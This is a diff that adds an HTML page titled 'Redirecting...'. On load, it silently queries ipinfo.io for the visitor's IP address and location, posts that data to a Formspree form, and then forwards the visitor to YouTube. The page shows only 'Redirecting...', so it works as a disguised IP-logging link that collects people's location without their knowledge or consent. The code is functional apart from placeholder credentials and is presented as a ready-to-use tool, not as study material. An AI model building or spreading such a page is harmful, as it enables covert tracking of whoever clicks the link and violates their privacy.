@@ -1,0 +1,33 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Redirecting...</title>
+  <script>
+    // Function to get IP & location using ipinfo.io API
+    async function logVisitorInfo() {
+      try {
+        const res = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE');
+        const data = await res.json();// Send to server (optional)
+    await fetch("https://formspree.io/f/YOUR_FORM_ID", {
+      method: "POST",
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(data),
+    });
+  } catch (err) {
+    console.error("Logging failed:", err);
+  } finally {
+    // Redirect to any site
+    window.location.href = "https://youtube.com";
+  }
+}
+
+// Run as soon as page loads
+window.onload = logVisitorInfo;
+
+  </script>
+</head>
+<body>
+  <p>Redirecting...</p>
+</body>
+</html>
